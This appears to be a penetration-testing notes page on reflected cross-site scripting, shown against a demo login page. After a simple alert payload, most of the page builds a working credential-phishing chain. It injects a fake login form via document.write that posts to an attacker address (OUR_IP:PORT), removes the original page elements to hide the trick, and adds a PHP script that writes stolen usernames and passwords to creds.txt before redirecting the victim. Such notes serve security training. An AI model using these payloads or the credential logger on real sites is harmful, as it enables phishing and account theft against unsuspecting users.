# Reflected XSS

Reflected XSS is non-persistent, and our input gets processed back by the back-end, like an error message. If the input was malicious and executed, we get a Reflected XSS.

Imagine a simple login form that displays an error message when invalid credentials are entered. We start the vulnerable demo server and try submitting a random username, we receive:

Copy

```
Login failed for user: test
```

Since the username is echoed back inside the response, we try injecting the same XSS payload used earlier:

Copy

```
<script>alert(document.domain)</script>
```

Submitting this triggers a pop-up in the browser, confirming our payload executed. Checking the page source reveals the error block:

Copy

```
<p>Login failed for user: <script>alert(document.domain)</script></p>
```

This shows our payload was inserted directly into the HTML.

> This is non-persistent. So to target a specific user would have to send the user a URL containing the payload/parameters (GET). For POST there are other techniques.

Copy

```
http://SERVER_IP:PORT/login.php?username=alert(document.domain)&password=test
```

## [Direct link to heading](reflected-xss.md#phishing-login-form-injection) Phishing (Login Form Injection)

Lets say we identified a working payload:

Copy

```
<script>alert('XSS')</script>
```

After identifying a working XSS payload, we can inject an HTML login form in it with an action attribute in the form element containing the attacker's IP to send information to (when the target clicks login).

Copy

```
<h1>Please login</h1>
<form action=http://OUR_IP> # Attacker IP where victim's credentials will be sent
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

We will use document.write() inside our identified payload

Copy

```
document.write('<h1>Please login</h1><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

Now instead of alert('XSS') we inject the login form HTML code above and our IP:

Copy

```
<script>document.write('<h1>Please login</h1><form action=http://OUR_IP:PORT><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
```

This will display the URL in the browser search bar. We can send this URL to the victim who will login with his/her credentials and send those credentials to our IP (e.g. In netcat).

### [Direct link to heading](reflected-xss.md#refining-the-attack-victims-view) Refining the Attack (Victim's View)

To make the form look less suspicious to the victim we can inject the below JS function after a ';' to remove the original elements from the page:

Copy

```
document.getElementById().remove() # We can get an elements id by looking at the page-source
```

Final payload after refining

Copy

```
<script>document.write('<h1>Please login</h1><form action=http://OUR_IP:PORT><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
```

If there is still some unwanted HTML left we can comment it out:

Copy

```
...PAYLOAD... <!--
```

After the victim sends the credentials to attacker's server, there should be a page to return to and not an error. We use a PHP script for both logging the credentials and loading the logged in page.

Replace IP with the landing page and serve the script using php instead of netcat

Copy

```
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/index.php");
    fclose($file);
    exit();
}
?>
```

[PreviousStored XSS](stored-xss.md) [NextDOM XSS](dom-xss.md)

Last updated 4 days ago
